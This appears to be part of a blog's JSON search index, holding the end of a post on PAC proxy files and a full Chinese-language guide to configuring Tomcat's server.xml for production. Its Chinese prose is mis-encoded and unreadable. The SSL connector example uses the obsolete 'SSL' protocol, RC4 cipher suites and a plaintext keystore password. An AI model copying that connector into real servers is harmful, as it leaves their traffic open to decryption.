\u0026#34;www.baidu.com\u0026#34;) {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e        return \u0026#34;PROXY 192.168.2.1:3128\u0026#34;;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e    else if (host == \u0026#34;www.sina.com.cn\u0026#34;) {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e        return \u0026#34;SOCKS 192.168.2.2:1080\u0026#34;;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e    else if (host == \u0026#34;www.sohu.com\u0026#34;) {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e        return \u0026#34;SOCKS 192.168.2.3:1080\u0026#34;;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e    }    \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e    else {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e        return \u0026#34;DIRECT\u0026#34;;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eEOF\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eå…¶å® PAC æ–‡ä»¶çš„å†…å®¹å°±æ˜¯ä¸€æ®µ javascriptï¼Œç”¨æ¥è¿”å›ä»£ç†çš„åœ°å€\u003c/p\u003e","title":"linuxä¸‹web pacproxyçš„ç”¨æ³•"},{"content":"Tomcat æ˜¯ä¸€ä¸ª HTTP serverã€‚åŒæ—¶ï¼Œå®ƒä¹Ÿæ˜¯ä¸€ä¸ª serverlet å®¹å™¨ï¼Œå¯ä»¥æ‰§è¡Œ java çš„ Servletï¼Œä¹Ÿå¯ä»¥æŠŠ JavaServer Pagesï¼ˆJSPï¼‰å’Œ JavaServerFacesï¼ˆJSFï¼‰ç¼–è¯‘æˆ Java Servletã€‚å®ƒçš„æ¨¡å‹å›¾å¦‚ä¸‹ï¼š\nç»™ä¸ªç”Ÿäº§ç¯å¢ƒ server.xml çš„ä¾‹å­ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 \u0026lt;?xml version=\u0026#39;1.0\u0026#39; encoding=\u0026#39;utf-8\u0026#39;?\u0026gt; \u0026lt;Server port=\u0026#34;-1\u0026#34; shutdown=\u0026#34;SHUTDOWN\u0026#34;\u0026gt; \u0026lt;Listener className=\u0026#34;org.apache.catalina.startup.VersionLoggerListener\u0026#34; /\u0026gt; \u0026lt;Listener className=\u0026#34;org.apache.catalina.core.AprLifecycleListener\u0026#34; SSLEngine=\u0026#34;on\u0026#34; /\u0026gt; \u0026lt;Listener className=\u0026#34;org.apache.catalina.core.JreMemoryLeakPreventionListener\u0026#34; /\u0026gt; \u0026lt;Listener className=\u0026#34;org.apache.catalina.mbeans.GlobalResourcesLifecycleListener\u0026#34; /\u0026gt; \u0026lt;Listener className=\u0026#34;org.apache.catalina.core.ThreadLocalLeakPreventionListener\u0026#34; /\u0026gt; \u0026lt;GlobalNamingResources\u0026gt; \u0026lt;Resource name=\u0026#34;UserDatabase\u0026#34; auth=\u0026#34;Container\u0026#34; type=\u0026#34;org.apache.catalina.UserDatabase\u0026#34; description=\u0026#34;User database that can be updated and saved\u0026#34; factory=\u0026#34;org.apache.catalina.users.MemoryUserDatabaseFactory\u0026#34; pathname=\u0026#34;conf/tomcat-users.xml\u0026#34; /\u0026gt; \u0026lt;/GlobalNamingResources\u0026gt; \u0026lt;Service name=\u0026#34;Catalina\u0026#34;\u0026gt; \u0026lt;Connector port=\u0026#34;8080\u0026#34; server=\u0026#34;www.rendoumi.com\u0026#34; protocol=\u0026#34;org.apache.coyote.http11.Http11NioProtocol\u0026#34; maxHttpHeaderSize=\u0026#34;8192\u0026#34; acceptCount=\u0026#34;500\u0026#34; maxThreads=\u0026#34;1000\u0026#34; minSpareThreads=\u0026#34;200\u0026#34; enableLookups=\u0026#34;false\u0026#34; redirectPort=\u0026#34;8443\u0026#34; connectionTimeout=\u0026#34;20000\u0026#34; relaxedQueryChars=\u0026#34;[]|{}@!$*()+\u0026#39;.,;^\\`\u0026amp;quot;\u0026amp;lt;\u0026amp;gt;\u0026#34; disableUploadTimeout=\u0026#34;true\u0026#34; allowTrace=\u0026#34;false\u0026#34; URIEncoding=\u0026#34;UTF-8\u0026#34; useBodyEncodingForURI=\u0026#34;true\u0026#34; /\u0026gt; \u0026lt;Engine name=\u0026#34;Catalina\u0026#34; defaultHost=\u0026#34;localhost\u0026#34;\u0026gt; \u0026lt;Realm className=\u0026#34;org.apache.catalina.realm.LockOutRealm\u0026#34;\u0026gt; \u0026lt;Realm className=\u0026#34;org.apache.catalina.realm.UserDatabaseRealm\u0026#34; resourceName=\u0026#34;UserDatabase\u0026#34;/\u0026gt; \u0026lt;/Realm\u0026gt; \u0026lt;Host name=\u0026#34;localhost\u0026#34; appBase=\u0026#34;webapps\u0026#34; unpackWARs=\u0026#34;false\u0026#34; autoDeploy=\u0026#34;false\u0026#34;\u0026gt; \u0026lt;Valve className=\u0026#34;org.apache.catalina.valves.AccessLogValve\u0026#34; directory=\u0026#34;logs\u0026#34; prefix=\u0026#34;access_log.\u0026#34; suffix=\u0026#34;.txt\u0026#34; fileDateFormat=\u0026#34;yyyy-MM-dd\u0026#34; pattern=\u0026#34;%a|%A|%T|%{X-Forwarded-For}i|%l|%u|%t|%r|%s|%b|%{Referer}i|%{User-Agent}i \u0026#34; resolveHosts=\u0026#34;false\u0026#34;/\u0026gt; \u0026lt;Context path=\u0026#34;\u0026#34; docBase=\u0026#34;/export/servers/tomcat/webapps/web\u0026#34; /\u0026gt; \u0026lt;/Host\u0026gt; \u0026lt;/Engine\u0026gt; \u0026lt;/Service\u0026gt; \u0026lt;/Server\u0026gt; åˆ†è§£å¼€æ¥ä¸€éƒ¨åˆ†ä¸€éƒ¨åˆ†çš„çœ‹ï¼š\nServer Server ç¬¬2è¡Œï¼Œæ˜¯æœ€å¤§ä¸”å¿…é¡»å”¯ä¸€çš„ç»„ä»¶ã€‚è¡¨ç¤ºä¸€ä¸ª Tomcat çš„å®ä¾‹ï¼Œå®ƒå¯ä»¥åŒ…å«å¤šä¸ª Servicesï¼Œè€Œæ¯ä¸ª Service éƒ½å¯ä»¥æœ‰è‡ªå·±çš„ Engine å’Œ connectorsã€‚\n\u0026lt;Server port=\u0026#34;8005\u0026#34; shutdown=\u0026#34;SHUTDOWN\u0026#34;\u0026gt; ...... \u0026lt;/Server\u0026gt; æ³¨æ„ä¸Šé¢ï¼Œæˆ‘ä»¬æŠŠç¼ºçœçš„ port=\u0026ldquo;8005\u0026rdquo; æ”¹æˆäº† â€œ-1â€ï¼Œè¿™æ ·é˜²æ­¢ä»8005é‡å¯ï¼Œé¿å…å®‰å…¨é—®é¢˜ã€‚\nListeners ä¸€ä¸ª Server å®¹å™¨æ‹¥æœ‰è‹¥å¹² Listeners (è¡Œ 3-7)ã€‚ä¸€ä¸ª Listener ç›‘å¬å¹¶å›åº”ç‰¹å®šçš„äº‹ä»¶.\nä¾‹å¦‚ GlobalResourcesLifecycleListener å°±è®¾ç½®äº† global resourcesï¼Œè¿™æ ·å°±å¯ä»¥ä½¿ç”¨ JNDI æ¥å­˜å–åƒæ•°æ®åº“è¿™ç§èµ„æºã€‚\n\u0026lt;Listener className=\u0026#34;org.apache.catalina.mbeans.GlobalResourcesLifecycleListener\u0026#34; /\u0026gt; Global Naming Resources \u0026lt;GlobalNamingResources\u0026gt; (è¡Œ 9-15) å®šä¹‰äº† JNDI (Java Naming and Directory Interface) èµ„æºï¼Œè¿™ä¸ªæ˜¯ LDAP çš„ä¸œè¥¿ï¼Œå…è®¸ java è½¯ä»¶é€šè¿‡ç›®å½•å‘ç°å¯¹è±¡å’Œå±æ€§å€¼ã€‚\nç¼ºçœå®šä¹‰äº†ä¸€ä¸ª UserDatabase çš„ JNDI èµ„æºï¼ˆè¡Œ 10-14ï¼‰ï¼Œè¿™ä¸ªå¯¹è±¡å…¶å®æ˜¯ä¸€ä¸ªå†…å­˜æ•°æ®åº“ï¼Œä¿å­˜ç€ä» conf/tomcat-users.xml ä¸­åŠ è½½ä¸Šæ¥çš„ç”¨æˆ·è®¤è¯æ•°æ®ã€‚\n\u0026lt;GlobalNamingResources\u0026gt; \u0026lt;Resource name=\u0026#34;UserDatabase\u0026#34; auth=\u0026#34;Container\u0026#34; type=\u0026#34;org.apache.catalina.UserDatabase\u0026#34; description=\u0026#34;User database that can be updated and saved\u0026#34; factory=\u0026#34;org.apache.catalina.users.MemoryUserDatabaseFactory\u0026#34; pathname=\u0026#34;conf/tomcat-users.xml\u0026#34; /\u0026gt; \u0026lt;/GlobalNamingResources\u0026gt; æˆ‘ä»¬å¯ä»¥å†å®šä¹‰ä¸€ä¸ª Mysql ä¹‹ç±»çš„ JNDI æ¥ä¿å­˜ mysql æ•°æ®åº“è¿æ¥ä¿¡æ¯ï¼Œç”¨æ¥å®ç°è¿æ¥æ± \nServices Service ç”¨æ¥å…³è”å¤šä¸ª Connectors åˆ° Engineã€‚ç¼ºçœçš„é…ç½®æ˜¯é…äº†ä¸€ä¸ª å«åš Catalina çš„ Service ï¼ŒCatalinna ç¼ºçœé…äº†ä¸¤ä¸ª Connectorsï¼Œä¸€ä¸ªæ˜¯8080çš„HTTPï¼Œä¸€ä¸ªæ˜¯8009çš„AJPã€‚\n\u0026lt;Service name=\u0026#34;Catalina\u0026#34;\u0026gt; \u0026lt;Connector port=\u0026#34;8080\u0026#34; protocol=\u0026#34;HTTP/1.1\u0026#34; connectionTimeout=\u0026#34;20000\u0026#34; redirectPort=\u0026#34;8443\u0026#34; /\u0026gt; \u0026lt;Connector port=\u0026#34;8009\u0026#34; protocol=\u0026#34;AJP/1.3\u0026#34; redirectPort=\u0026#34;8443\u0026#34; /\u0026gt; \u0026lt;/Service\u0026gt; æ³¨æ„æœ€ä¸Šé¢çš„é…ç½®ï¼Œæˆ‘ä»¬å–æ¶ˆäº†8009çš„AJPï¼Œè¿™ä¸ªåè®®ç°åœ¨åŸºæœ¬æ²¡äººç”¨ï¼Œå–æ¶ˆæ‰ä¹Ÿé¿å…å®‰å…¨é—®é¢˜ã€‚\nä¸‹é¢ç»™å‡ºä¸€ä¸ª SSL 8443 çš„ connectors çš„ä¾‹å­\n\u0026lt;Connector port=\u0026#34;8443\u0026#34; maxHttpHeaderSize=\u0026#34;8192\u0026#34; SSLEnabled=\u0026#34;true\u0026#34; server=\u0026#34;Rendoumi\u0026#34; maxThreads=\u0026#34;150\u0026#34; minSpareThreads=\u0026#34;25\u0026#34; maxSpareThreads=\u0026#34;75\u0026#34; enableLookups=\u0026#34;false\u0026#34; disableUploadTimeout=\u0026#34;true\u0026#34; acceptCount=\u0026#34;100\u0026#34; scheme=\u0026#34;https\u0026#34; secure=\u0026#34;true\u0026#34; clientAuth=\u0026#34;false\u0026#34; URIEncoding=\u0026#34;UTF-8\u0026#34; sslProtocol=\u0026#34;SSL\u0026#34; ciphers=\u0026#34;SSL_RSA_WITH_RC4_128_MD5, SSL_RSA_WITH_RC4_128_SHA\u0026#34; keystoreFile=\u0026#34;/export/servers/tomcat/rendoumi.keystore\u0026#34; keystorePass=\u0026#34;Fuck2020\u0026#34; /\u0026gt; Containers æ¦‚å¿µ Tomcat çš„å®¹å™¨æ¦‚å¿µï¼ŒTomcatè®¤ä¸º Engine, Host, Context å’Œ Clusterå¤„åœ¨åŒä¸€ä¸ªå®¹å™¨ä¸­. æœ€é¡¶å±‚çš„æ˜¯ Engine; æœ€åº•å±‚æ˜¯Contextã€‚\nå¦å¤–åƒ Realm å’Œ Valveï¼Œä¹Ÿå¯ä»¥æ”¾åœ¨å®¹å™¨ä¸­\nEngine Engine æ˜¯å®¹å™¨çš„é¡¶ç«¯ï¼Œå¯ä»¥åŒ…å«æœ‰è‹¥å¹² Hostsã€‚æˆ‘ä»¬å¯ä»¥é…ç½® tomcat æœåŠ¡å¤šä¸ªè™šæ‹Ÿä¸»æœºã€‚ä¸‹é¢é…ç½®å°±æ˜¯æœåŠ¡æœ¬æœºçš„ä¸€ä¸ªæœåŠ¡ã€‚\n\u0026lt;Engine name=\u0026#34;Catalina\u0026#34; defaultHost=\u0026#34;localhost\u0026#34;\u0026gt; Catalina Engine ä» HTTP connector å¤„æ¥æ”¶åˆ°å®¢æˆ·ç«¯çš„ HTTP è¯·æ±‚ï¼Œæ ¹æ®è¯·æ±‚å¤´ä¸­ Host: xxx çš„å†…å®¹ï¼ŒæŠŠè¯·æ±‚è·¯ç”±åˆ°æŸä¸ªå…·ä½“çš„ Hostä¸Šã€‚\nRealm Realm æœ¬è´¨æ˜¯ä¸€ä¸ªæ•°æ®åº“ï¼Œæ˜¯ç”¨æ¥ä¿å­˜ç”¨æˆ·åã€å¯†ç ã€è®¤è¯è§’è‰²çš„ä¸œè¥¿ã€‚\n\u0026lt;Realm className=\u0026#34;org.apache.catalina.realm.LockOutRealm\u0026#34;\u0026gt; \u0026lt;Realm className=\u0026#34;org.apache.catalina.realm.UserDatabaseRealm\u0026#34; resourceName=\u0026#34;UserDatabase\u0026#34;/\u0026gt; \u0026lt;/Realm\u0026gt; Hosts Host å®šä¹‰äº†è™šæ‹Ÿä¸»æœºï¼Œå¯ä»¥å®šä¹‰å¤šä¸ªè™šæ‹Ÿä¸»æœºã€‚å…¶ä¸­ appBase åƒä¸‡ä¸èƒ½ä¸ºç©ºï¼Œå¦åˆ™å°±å¯ä»¥è¯»åˆ° tomcat çš„æ‰€æœ‰æ–‡ä»¶ï¼Œå°±å‡ºçº¿ä¸Šäº‹æ•…å¤§ Bug äº†ï¼ï¼ï¼\n\u0026lt;Host name=\u0026#34;localhost\u0026#34; appBase=\u0026#34;webapps\u0026#34; unpackWARs=\u0026#34;true\u0026#34; autoDeploy=\u0026#34;true\u0026#34;\u0026gt; æˆ‘ä»¬æœ€ä¸Šé¢çš„ç”Ÿäº§é…ç½®ï¼Œä¸è‡ªè§£å‹ï¼Œä¹Ÿä¸è‡ªåŠ¨éƒ¨ç½²ã€‚\nValve Valve æ˜¯ç”¨æ¥æ‹¦æˆª HTTP requestsçš„ï¼Œåšé¢„å¤„ç†åå†äº¤ç»™ä¸‹ä¸€ä¸ªç»„ä»¶ï¼Œå®ƒèƒ½åœ¨ Engine, Host, Context ä¸­è¢«å®šä¹‰ã€‚ä¸‹é¢çš„ä¾‹å­å°±æ˜¯åœ¨ Engine ä¸­åšäº†æ‹¦æˆªï¼Œå®šä¹‰äº†æ—¥å¿—æ ¼å¼ï¼Œäº¤ç»™ä¸‹ä¸€ä¸ªæ—¥å¿—å¤„ç†ç»„ä»¶åšå¤„ç†ã€‚\nç¼ºçœé…ç½®\n\u0026lt;Valve className=\u0026#34;org.apache.catalina.valves.AccessLogValve\u0026#34; directory=\u0026#34;logs\u0026#34; prefix=\u0026#34;localhost_access_log.\u0026#34; suffix=\u0026#34;.txt\u0026#34; pattern=\u0026#34;%h %l %u %t \u0026amp;quot;%r\u0026amp;quot; %s %b\u0026#34; /\u0026gt; æˆ‘ä»¬çš„é…ç½®ä¿®æ”¹äº†ç¼ºçœçš„æ—¥å¿—æ ¼å¼ï¼Œå¤šäº†å¾ˆå¤šæ˜ç»†çš„å†…å®¹ï¼Œæ”¹å˜äº†åˆ†å‰²ç¬¦ï¼š\n\u0026lt;Valve className=\u0026#34;org.apache.catalina.valves.AccessLogValve\u0026#34; directory=\u0026#34;logs\u0026#34; prefix=\u0026#34;access_log.\u0026#34; suffix=\u0026#34;.txt\u0026#34; fileDateFormat=\u0026#34;yyyy-MM-dd\u0026#34; pattern=\u0026#34;%a|%A|%T|%{X-Forwarded-For}i|%l|%u|%t|%r|%s|%b|%{Referer}i|%{User-Agent}i \u0026#34; resolveHosts=\u0026#34;false\u0026#34;/\u0026gt; Context Contextå®šä¹‰äº†å…·ä½“çš„è®¿é—®è·¯å¾„ï¼Œä¸€å®šè¦æŒ‡å®š docBase ï¼ï¼ï¼å¤§å®¶ä¸€å®šè¦è®°ä½ appBase å’Œ docBase ä¸åŒä¸ºç©ºï¼ï¼ï¼\n\u0026lt;Context path=\u0026#34;\u0026#34; docBase=\u0026#34;/export/servers/tomcat/webapps/web\u0026#34; /\u0026gt; å¦‚ä¸Šï¼Œæˆ‘ä»¬å°±é…å¥½äº†ä¸€ä¸ªç”Ÿäº§ç¯å¢ƒçš„ server.xml ï¼Œæ³¨æ„ï¼Œè¿™ä¸ª xml æ–‡ä»¶æ˜¯å¯ä»¥æ”¾åœ¨è§£å¼€çš„tomcatå‹ç¼©åŒ… apache-tomcat-8.5.64 ç›®å½•ä¹‹å¤–çš„ã€‚\næˆ‘ä»¬å†å¦å¤–ç¼–å†™ä¸€ä¸ªå¯åŠ¨æ–‡ä»¶ start.shï¼š\n#!/bin/sh export JAVA_OPTS=\u0026#34;-server -Xms1024m -Xmx2048m -Djava.awt.headless=true -Dsun.net.client.defaultConnectTimeout=60000 -Dsun.net.client.defaultReadTimeout=60000 -Djmagick.systemclassloader=no -Dnetworkaddress.cache.ttl=300 -Dsun.net.inetaddr.ttl=300\u0026#34; export CATALINA_HOME=/export/servers/tomcat/apache-tomcat-8.5.64 cd /export/servers/tomcat/ $CATALINA_HOME/bin/catalina.sh start -config \u0026#34;/export/servers/tomcat/server.xml\u0026#34; è¿™æ ·ï¼Œæˆ‘ä»¬çš„å¯åŠ¨æ–‡ä»¶å’Œé…ç½®æ–‡ä»¶ï¼Œå°±å’Œ tomcat ç›®å½•åˆ†ç¦»äº†ï¼Œè¿™æ ·åšçš„å¥½å¤„æ˜¯å¦‚æœ tomcat éœ€è¦å‡çº§ï¼Œé‚£ä¹ˆç›´æ¥è§£å‹æ¢ç›®å½•å³å¯ã€‚\næˆ‘ä»¬å¯ä»¥åšä¸ªè½¯é“¾æ¥ tomcat é“¾æ¥åˆ° apache-tomcat-8.5.64ï¼Œè¿™æ ·æ›´æ–¹ä¾¿æ“ä½œã€‚\n","permalink":"https://rendoumi.com/posts/20211115-tomcat_config/","summary":"\u003cp\u003eTomcat æ˜¯ä¸€ä¸ª HTTP serverã€‚åŒæ—¶ï¼Œå®ƒä¹Ÿæ˜¯ä¸€ä¸ª serverlet å®¹å™¨ï¼Œå¯ä»¥æ‰§è¡Œ java çš„ Servletï¼Œä¹Ÿå¯ä»¥æŠŠ JavaServer Pagesï¼ˆJSPï¼‰å’Œ JavaServerFacesï¼ˆJSFï¼‰ç¼–è¯‘æˆ Java Servletã€‚å®ƒçš„æ¨¡å‹å›¾å¦‚ä¸‹ï¼š\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20211115193643613\" loading=\"lazy\" src=\"/posts/20211115-tomcat_config/image-20211115193643613.png\"\u003e\u003c/p\u003e\n\u003cp\u003eç»™ä¸ªç”Ÿäº§ç¯å¢ƒ server.xml çš„ä¾‹å­ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cdiv class=\"chroma\"\u003e\n\u003ctable class=\"lntable\"\u003e\u003ctr\u003e\u003ctd class=\"lntd\"\u003e\n\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode\u003e\u003cspan class=\"lnt\"\u003e 1\n\u003c/span\u003e\u003cspan class=\"lnt\"\u003e 2\n\u003c/span\u003e\u003cspan class=\"lnt\"\u003e 3\n\u003c/span\u003e\u003cspan class=\"lnt\"\u003e 4\n\u003c/span\u003e\u003cspan class=\"lnt\"\u003e 5\n\u003c/span\u003e\u003cspan class=\"lnt\"\u003e 6\n\u003c/span\u003e\u003cspan class=\"lnt\"\u003e 7\n\u003c/span\u003e\u003cspan class=\"lnt\"\u003e 8\n\u003c/span\u003e\u003cspan class=\"lnt\"\u003e 9\n\u003c/span\u003e\u003cspan class=\"lnt\"\u003e10\n\u003c/span\u003e\u003cspan class=\"lnt\"\u003e11\n\u003c/span\u003e\u003cspan class=\"lnt\"\u003e12\n\u003c/span\u003e\u003cspan class=\"lnt\"\u003e13\n\u003c/span\u003e\u003cspan class=\"lnt\"\u003e14\n\u003c/span\u003e\u003cspan class=\"lnt\"\u003e15\n\u003c/span\u003e\u003cspan class=\"lnt\"\u003e16\n\u003c/span\u003e\u003cspan class=\"lnt\"\u003e17\n\u003c/span\u003e\u003cspan class=\"lnt\"\u003e18\n\u003c/span\u003e\u003cspan class=\"lnt\"\u003e19\n\u003c/span\u003e\u003cspan class=\"lnt\"\u003e20\n\u003c/span\u003e\u003cspan class=\"lnt\"\u003e21\n\u003c/span\u003e\u003cspan class=\"lnt\"\u003e22\n\u003c/span\u003e\u003cspan class=\"lnt\"\u003e23\n\u003c/span\u003e\u003cspan class=\"lnt\"\u003e24\n\u003c/span\u003e\u003cspan class=\"lnt\"\u003e25\n\u003c/span\u003e\u003cspan class=\"lnt\"\u003e26\n\u003c/span\u003e\u003cspan class=\"lnt\"\u003e27\n\u003c/span\u003e\u003cspan class=\"lnt\"\u003e28\n\u003c/span\u003e\u003cspan class=\"lnt\"\u003e29\n\u003c/span\u003e\u003cspan class=\"lnt\"\u003e30\n\u003c/span\u003e\u003cspan class=\"lnt\"\u003e31\n\u003c/span\u003e\u003cspan class=\"lnt\"\u003e32\n\u003c/span\u003e\u003cspan class=\"lnt\"\u003e33\n\u003c/span\u003e\u003cspan class=\"lnt\"\u003e34\n\u003c/span\u003e\u003cspan class=\"lnt\"\u003e35\n\u003c/span\u003e\u003cspan class=\"lnt\"\u003e36\n\u003c/span\u003e\u003cspan class=\"lnt\"\u003e37\n\u003c/span\u003e\u003cspan class=\"lnt\"\u003e38\n\u003c/span\u003e\u003cspan class=\"lnt\"\u003e39\n\u003c/span\u003e\u003cspan class=\"lnt\"\u003e40\n\u003c/span\u003e\u003cspan class=\"lnt\"\u003e41\n\u003c/span\u003e\u003cspan class=\"lnt\"\u003e42\n\u003c/span\u003e\u003cspan class=\"lnt\"\u003e43\n\u003c/span\u003e\u003cspan class=\"lnt\"\u003e44\n\u003c/span\u003e\u003cspan class=\"lnt\"\u003e45\n\u003c/span\u003e\u003cspan class=\"lnt\"\u003e46\n\u003c/span\u003e\u003cspan class=\"lnt\"\u003e47\n\u003c/span\u003e\u003cspan class=\"lnt\"\u003e48\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\n\u003ctd class=\"lntd\"\u003e\n\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-ini\" data-lang=\"ini\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003e\u0026lt;?xml version\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;1.0\u0026#39; encoding=\u0026#39;utf-8\u0026#39;?\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003e\u0026lt;Server port\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;-1\u0026#34; shutdown=\u0026#34;SHUTDOWN\u0026#34;\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e  \u0026lt;Listener className=\u0026#34;org.apache.catalina.startup.VersionLoggerListener\u0026#34; /\u0026gt; \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e  \u0026lt;Listener className=\u0026#34;org.apache.catalina.core.AprLifecycleListener\u0026#34; SSLEngine=\u0026#34;on\u0026#34; /\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e  \u0026lt;Listener className=\u0026#34;org.apache.catalina.core.JreMemoryLeakPreventionListener\u0026#34; /\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e  \u0026lt;Listener className=\u0026#34;org.apache.catalina.mbeans.GlobalResourcesLifecycleListener\u0026#34; /\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e  \u0026lt;Listener className=\u0026#34;org.apache.catalina.core.ThreadLocalLeakPreventionListener\u0026#34; /\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"na\"\u003e\u0026lt;GlobalNamingResources\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003e\u0026lt;Resource name\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;UserDatabase\u0026#34; auth=\u0026#34;Container\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e              type=\u0026#34;org.apache.catalina.UserDatabase\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e              description=\u0026#34;User database that can be updated and saved\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e              factory=\u0026#34;org.apache.catalina.users.MemoryUserDatabaseFactory\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e              pathname=\u0026#34;conf/tomcat-users.xml\u0026#34; /\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e  \u0026lt;/GlobalNamingResources\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"na\"\u003e\u0026lt;Service name\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;Catalina\u0026#34;\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e    \u0026lt;Connector port=\u0026#34;8080\u0026#34; \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e               server=\u0026#34;www.rendoumi.com\u0026#34; \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e               protocol=\u0026#34;org.apache.coyote.http11.Http11NioProtocol\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e               maxHttpHeaderSize=\u0026#34;8192\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e               